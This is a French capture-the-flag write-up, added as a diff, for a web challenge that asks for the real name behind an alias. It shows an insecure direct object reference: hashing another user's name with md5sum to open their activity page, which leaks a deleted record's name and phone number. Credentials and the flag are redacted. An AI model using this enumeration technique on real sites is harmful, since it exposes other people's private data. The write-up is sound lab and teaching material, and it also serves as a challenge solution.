@@ -1,0 +1,84 @@
+Source locale : FEU.md
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+# FEU — Writeup
+
+- **Catégorie :** Web / Misc
+- **Valeur :** 300 points
+- **Cible :** `https://feu.hackerlab.bj`
+
+## Objectif
+
+Identifier le nom et le prénom correspondant à l’alias `mstrand`, à partir du numéro :
+
+```text
++042 74 82 61 39
+```
+
+## Accès
+
+Les identifiants fournis étaient :
+
+```text
+Utilisateur : <EXPURGE>
+Mot de passe : <EXPURGE>
+```
+
+Le mot de passe doit bien contenir la lettre `l` après `q`.
+
+## Recherche initiale
+
+La recherche `mstrand` renvoie la fiche :
+
+```text
+PER-2025-0500
+```
+
+La fiche est largement caviardée et la recherche directe du numéro ne renvoie aucun résultat.
+
+## Vulnérabilité : IDOR sur l’activité
+
+La page **My Activity** utilise une URL de la forme :
+
+```text
+/activity/<md5(username)>
+```
+
+Le hash du compte connecté est calculable avec :
+
+```bash
+printf '%s' '<EXPURGE>' | md5sum
+```
+
+L’historique de l’agent `khandor` est accessible en utilisant :
+
+```bash
+printf '%s' 'khandor' | md5sum
+# <HEX_EXPURGE>
+```
+
+URL exploitée :
+
+```text
+https://feu.hackerlab.bj/activity/<HEX_EXPURGE>
+```
+
+Aucun contrôle d’autorisation ne vérifie que l’utilisateur connecté possède cet historique.
+
+## Preuve
+
+Le journal de `khandor` contient une entrée de suppression révélant les champs de la fiche supprimée :
+
+```text
+Record deleted
+Person · Mikkel Strandhjelm
+number   +042 74 82 61 39
+lastName Strandhjelm
+firstName Mikkel
+```
+
+## Flag
+
+```text
+<EXPURGE>
+```
